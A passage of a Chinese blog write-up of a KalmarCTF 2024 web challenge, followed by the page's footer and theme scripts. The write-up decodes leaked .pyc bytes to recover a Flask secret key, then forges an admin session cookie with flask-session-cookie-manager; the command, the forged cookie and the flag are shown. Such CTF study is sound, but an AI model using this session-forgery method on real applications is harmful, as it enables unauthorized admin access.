+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 将字符串中的转义序列转换为相应的二进制数据</span></span><br><span class="line">binary_data = <span class="built_in">bytes</span>(data_str, <span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&quot;unicode_escape&quot;</span>).encode(<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output_binary_data.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(binary_data)</span><br></pre></td></tr></table></figure>
+
+<p><code>.pyc</code>文件的逆向在网上就很多在线的工具可以进行使用，逆向后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># visit https://tool.lu/pyc/ for more information</span><br><span class="line"># Version: Python 3.11</span><br><span class="line"></span><br><span class="line">session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再使用session伪造工具<code>flask-session-cookie-manager</code>为造出一个session出来，指令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27; -t &quot;&#123;&#x27;admin&#x27;:True&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最后得到伪造的session所对应的cookie为：<code>eyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-o</code>，手动填入浏览器中，并访问&#x2F;flag</p>
+<p><img src="/posts/fbcd83ad/4ac0b231a81aeef5ed48fde37b6f6650.png" alt="4ac0b231a81aeef5ed48fde37b6f6650"></p>
+<p>最后得到flag：<code>kalmar&#123;Rem3Mbr_T0_fl0sh!&#125;</code></p>
+<details class="tag-plugin colorful folding" ><summary><p>查看Wells的丢人过程</p>
+</summary><div class="body"><p>我想着不是伪造出session最后的结果时运行<code>/readflag</code>这个可执行文件，便尝试读取了一下，转化为二进制，再发给逆向的同学看看能不能找出flag<strong>位于哪里命名为什么</strong>直接读取出来</p> <p>也确实逆向出来，找到了flag的位置以及名称</p> <p><img src="/3e0b6376b99ca459bfbfb08201947ec8.png" alt="3e0b6376b99ca459bfbfb08201947ec8"></p> <p>但出题人也估计想到了这一点，位于<code>flag.txt</code>设置了权限，没法被直接读取出来。。。。。。。</p> <p><strong>跪谢逆向的同学：L0SJ0K</strong></p> </div></details>
+
+</article>
+<div class="article-footer">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://ireland.re/posts/KalmarCTF_2024/">KalmarCTF 2024 Web Challenges</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://wells.host/posts/fbcd83ad/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://wells.host/posts/fbcd83ad/&title=2024KalmarCTF-WEB复盘 - Wells's Blog&summary=
+前言：
+靶场链接：https://kalmarc.tf/challenges
+难度太大了根本写不出来参考大佬的题解最后复盘出来的
+原文链接：https://ireland.re/posts/KalmarCTF_2024/
+
+复盘题解..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=2024KalmarCTF-WEB复盘 - Wells's Blog&amp;body=https://wells.host/posts/fbcd83ad/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://wells.host/posts/fbcd83ad/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/d35506b2/">服务器端请求伪造(SSRF)</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/895d3c4b/">中间件漏洞</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="we11s/blog-comment" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="true" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Wells</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3"><span class="toc-text">复盘题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ez-%E2%9B%B3-v2"><span class="toc-text">Ez ⛳ v2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadAss-Server-for-Hypertext"><span class="toc-text">BadAss Server for Hypertext</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E1%EF%BC%9A"><span class="toc-text">逻辑漏洞1：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E2%EF%BC%9A"><span class="toc-text">逻辑漏洞2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E3%EF%BC%9A"><span class="toc-text">逻辑漏洞3：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Is-It-Down"><span class="toc-text">Is It Down</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pycache-%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-text">__pycache__文件夹</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
